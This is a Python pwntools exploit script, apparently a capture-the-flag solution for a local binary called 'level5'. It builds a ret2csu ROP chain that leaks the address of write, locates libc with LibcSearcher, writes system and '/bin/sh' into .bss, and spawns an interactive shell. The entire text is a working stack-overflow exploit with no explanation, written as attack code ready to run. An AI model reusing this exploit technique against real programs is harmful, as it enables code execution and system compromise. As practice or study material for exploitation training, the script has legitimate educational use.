from pwn import *
from LibcSearcher import LibcSearcher

p=process('./level5')

e=ELF('./level5')

bss_addr=0x601028 
def buildpayload(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):
	pay=b'a'*buf+p64(0)
	pay=pay+p64(g1)+p64(0)
	pay=pay+p64(rbx)+p64(rbp)
	pay=pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	pay=pay+p64(g2)
	pay=pay+b'\00'*0x38+p64(lest_cell)

	return pay

pay=buildpayload(0x0000000000400606,0x0000000004005F0,0x80,0,1,e.got['write'],1,e.got['write'],8,e.symbols['main'])
print(p.recvline())
p.sendline(pay)
sleep(3)

write_real=p.recv(8)

libc = LibcSearcher('write', u64(write_real))
libcbase =u64(write_real) - libc.dump('write')

system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
binsh="/bin/sh\n"
sleep(1)
pay=buildpayload(0x0000000000400606,0x0000000004005F0,0x80,0,1,e.got['read'],0,bss_addr,16,e.symbols['main'])
print(p.recvline())
p.sendline(pay)
sleep(2)
p.send(p64(system_addr))
p.send("/bin/sh\0")
print(len(p64(system_addr)),"/bin/sh\0")
sleep(2)

pay=buildpayload(0x0000000000400606,0x0000000004005F0,0x80,0,1,bss_addr,bss_addr+8,0,0,e.symbols['main'])
sleep(2)
p.send(pay)
sleep(2)
print(p.recvline())
p.interactive()
